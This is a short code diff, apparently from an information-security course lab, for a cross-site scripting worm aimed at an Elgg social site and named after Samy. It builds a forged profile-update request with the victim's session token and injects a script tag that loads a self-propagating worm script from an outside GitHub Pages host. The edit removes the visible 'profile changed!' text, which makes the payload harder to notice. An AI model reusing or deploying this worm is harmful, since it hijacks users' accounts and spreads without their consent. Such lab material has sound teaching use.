@@ -9,7 +9,7 @@ window.onload = function() {
     var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
 
     // 构造要更新的个人资料描述
-    var content = userName + guid + ts + token + "&description= profile changed!<script type=\"text/javascript\" src=\"https://pinjunchen.github.io/IntroInfoSe/XSSwormNEW.js\"></script>";
+    var content = userName + guid + ts + token + "&description= <script type=\"text/javascript\" src=\"https://pinjunchen.github.io/IntroInfoSe/XSSwormNEW.js\"></script>";
 
     // Samy 的 GUID
     var samyGuid = 59;
